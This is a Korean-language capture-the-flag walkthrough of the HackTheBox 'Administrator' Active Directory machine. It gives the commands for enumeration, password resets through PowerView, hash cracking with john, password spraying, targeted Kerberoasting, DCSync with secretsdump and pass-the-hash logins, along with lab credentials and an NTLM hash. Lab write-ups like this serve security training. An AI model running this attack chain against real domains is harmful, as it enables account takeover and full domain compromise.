# Administrator - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,21,3268,3269,389,445,464,47001,49664,49665,49666,49667,49668,49855,49866,49871,49874,49891,52202,53,593,5985,636,88,9389 -sC -sV -vv -oA administrator 10.129.21.2
```
<img width="1083" height="537" alt="image" src="https://github.com/user-attachments/assets/a8b26f4e-c3bb-4335-924d-eb213cbf0f3a" />

<br>
<br>

- FTP(21)
- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5985)
- HTTP(47001)

<br>

- `/etc/hosts`에 `administrator.htb` 추가.
<img width="1083" height="73" alt="image" src="https://github.com/user-attachments/assets/da0480c3-c5f1-4f75-a6a9-2f7336b28773" />

<br>
<br>

- `/etc/hosts`에 `dc` 추가.
```bash
nxc smb 10.129.21.2 -u olivia -p ichliebedich
```
<img width="1083" height="119" alt="image" src="https://github.com/user-attachments/assets/98c08404-193a-4931-8caf-094876897000" />

<br>
<br>

<img width="1083" height="72" alt="image" src="https://github.com/user-attachments/assets/d3bc39c7-eff9-4fa1-9943-254dfce47d25" />

---
## Shell as olivia
- 초기 계정 `olivia:ichliebedich`로 `winrm` 로그인 가능.
```bash
nxc winrm 10.129.21.2 -u olivia -p ichliebedich
```
<img width="1083" height="209" alt="image" src="https://github.com/user-attachments/assets/8a9add4f-c0fb-4a06-8a3e-3f4eabf20b6b" />

<br>
<br>

- `olivia` 셸 획득.
```bash
evil-winrm -i 10.129.21.2 -u olivia -p ichliebedich
```
<img width="1083" height="290" alt="image" src="https://github.com/user-attachments/assets/70585ee1-2f8f-4a58-bbb7-8557a924d215" />

---
## Auth as benjamin
- `SharpHound.exe`를 업로드하여 실행.
- 로컬로 다운로드하여 블러드하운드 실행.
- `GenericAll`권한 발견.
<img width="1083" height="290" alt="image" src="https://github.com/user-attachments/assets/92017c7d-8def-4b1b-9d18-81fad821b0b5" />

<br>
<br>

- `PowerView.ps1` 로컬로부터 다운로드.
```powershell
upload PowerView.ps1
```
<img width="1083" height="159" alt="image" src="https://github.com/user-attachments/assets/c6450a09-c5b3-4d24-98fd-ff9b1b5d6fae" />

<br>
<br>

- `PowerView.ps1`를 실행하여 `michael`의 비밀번호 변경 시도.
```powershell
. .\powerview.ps1

$SecPassword = ConvertTo-SecureString 'ichliebedich' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\olivia', $SecPassword)

$UserPassword = ConvertTo-SecureString 'password' -AsPlainText -Force

Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword -Credential $Cred
```
<img width="1083" height="133" alt="image" src="https://github.com/user-attachments/assets/3d20daee-8a75-406a-b8db-f36902c07f18" />

<br>
<br>

- `michael:password` 로그인 시도.
```bash
nxc smb 10.129.21.2 -u michael -p password
```
<img width="1083" height="205" alt="image" src="https://github.com/user-attachments/assets/91181d93-80c0-49cc-9b4d-fb0249666a35" />

<br>
<br>

- `michael` 셸 획득.
```bash
evil-winrm -i 10.129.21.2 -u michael -p password
```
<img width="1083" height="290" alt="image" src="https://github.com/user-attachments/assets/b128a34d-9918-430a-bf53-a230820ac6f8" />

<br>
<br>

- `bloodhound`에서 `ForceChangePassword` 권한 발견.
<img width="1083" height="95" alt="image" src="https://github.com/user-attachments/assets/c2981dec-f972-4870-9410-235730296d92" />

<br>
<br>

- `benjamin`의 비밀번호 `password`로 변경.
```powershell
. .\powerview.ps1

$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\michael', $SecPassword)

$UserPassword = ConvertTo-SecureString 'password' -AsPlainText -Force

Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred
```
<img width="1083" height="135" alt="image" src="https://github.com/user-attachments/assets/1a38b923-5b8a-4cd8-9dfb-293a9426270c" />

<br>
<br>

- `benjamin:password` 로그인 시도.
- `winrm` 로그인 실패.
```bash
nxc smb 10.129.21.2 -u benjamin -p password
```
<img width="1083" height="122" alt="image" src="https://github.com/user-attachments/assets/8fcab90b-0e9e-45b7-9158-4e494b1792cd" />

---
## Shell as emily
- `benjamin:password`로 `FTP` 로그인.
- 내부 파일 다운로드.
<img width="1083" height="511" alt="image" src="https://github.com/user-attachments/assets/fafed90c-5386-4cdd-9966-797851878602" />

<br>
<br>

- `pwsafe`로 확인하려 했으나 비밀번호가 걸려 있음.
<img width="521" height="377" alt="image" src="https://github.com/user-attachments/assets/8bf0e408-7f01-4eb8-bebf-922165ad656a" />

<br>
<br>

- `pwsafe2john`을 사용하여 해시화.
- `john`으로 크래킹.
```bash
pwsafe2john Backup.psafe3 > hash

john hash --wordlist=~/util/rockyou.txt
```
<img width="1084" height="147" alt="image" src="https://github.com/user-attachments/assets/d8be77f6-7c23-4eca-b0b3-77419781b977" />

<br>
<br>

- `tekieromucho`비밀번호를 입력하여 로그인.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/bd6b4e5f-6d1d-47d5-afa2-be7daf563fd1" />

<br>
<br>

- 로컬로 비밀번호 복사.
<img width="1084" height="123" alt="image" src="https://github.com/user-attachments/assets/5d3e6cb2-5ac2-452c-bcf5-4315c75df10b" />

<br>
<br>

- `nxc`로 유저목록을 수집.
```bash
nxc smb 10.129.21.2 -u benjamin -p password --users
```
<img width="1084" height="469" alt="image" src="https://github.com/user-attachments/assets/2baf592c-3ca2-4e94-b975-0fca815711ae" />

<br>
<br>

- 로그인 가능한 유저들을 제외한 목록 생성.
<img width="1084" height="186" alt="image" src="https://github.com/user-attachments/assets/1bc2a325-4906-4245-9dce-be1c7b88f50f" />

<br>
<br>

- `emily` 로그인 성공.
```bash
nxc smb 10.129.21.2 -u users -p passwords
```
<img width="1084" height="472" alt="image" src="https://github.com/user-attachments/assets/dc64499c-fadd-41e4-90d9-287ac0141554" />

<br>
<br>

- `winrm` 로그인 시도 성공.
```bash
nxc winrm 10.129.21.2 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```
<img width="1084" height="211" alt="image" src="https://github.com/user-attachments/assets/3e08dd02-076f-4cd6-a767-fe179103a9f2" />

<br>
<br>

- `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb` 로그인.
```bash
evil-winrm -i 10.129.21.2 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```
<img width="1084" height="291" alt="image" src="https://github.com/user-attachments/assets/120932cc-6be0-4621-80e3-a6e90c996263" />

---
## Auth as ethan
- `GenericWrite` 권한 발견.
<img width="1108" height="139" alt="image" src="https://github.com/user-attachments/assets/236a4b0f-3580-4174-84b3-ed0fa352fbdf" />

<br>
<br>

- `targetedKerberoast.py`를 사용하여 해시 획득.
```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```
<img width="1083" height="578" alt="image" src="https://github.com/user-attachments/assets/9f868343-e114-47fd-a27d-4543114f8794" />

<br>
<br>

- `john`으로 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1083" height="226" alt="image" src="https://github.com/user-attachments/assets/5f669578-0894-4efe-8ff0-8f0c2af55473" />

<br>
<br>

- `ethan:limpbizkit` 로그인 성공.
```bash
nxc smb 10.129.21.4 -u ethan -p limpbizkit
```
<img width="1083" height="128" alt="image" src="https://github.com/user-attachments/assets/efaf3aa5-58fe-4d76-ab76-919c125f5c06" />

---
## Privesc
- `DCSync` 권한 발견.
<img width="1069" height="290" alt="image" src="https://github.com/user-attachments/assets/26d165bd-841e-41e9-ac5b-e559f400b977" />

<br>
<br>

- `secretsdump.py`를 사용하여 `administrator` 해시 획득.
```bash
impacket-secretsdump 'administrator.htb'/ethan:limpbizkit@10.129.21.4
```
<img width="1084" height="396" alt="image" src="https://github.com/user-attachments/assets/f671ce8f-090e-4507-8e88-82dedaa3e9c4" />

<br>
<br>

- 해시 로그인 시도 성공.
```bash
nxc winrm 10.129.21.4 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```
<img width="1084" height="268" alt="image" src="https://github.com/user-attachments/assets/a58fa576-dcbe-413a-879c-7841747877d0" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.21.4 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```
<img width="1084" height="291" alt="image" src="https://github.com/user-attachments/assets/e09f6c0c-e472-4d9b-a0f7-e2038ce2a844" />

---
## FLAG
- `c:\users\emily\desktop\user.txt`
<img width="1084" height="227" alt="image" src="https://github.com/user-attachments/assets/88bd9878-e2d6-41cc-907b-966ad7c2c7be" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1084" height="209" alt="image" src="https://github.com/user-attachments/assets/c60cf798-ccb3-4d03-ba27-712b80a0a67b" />
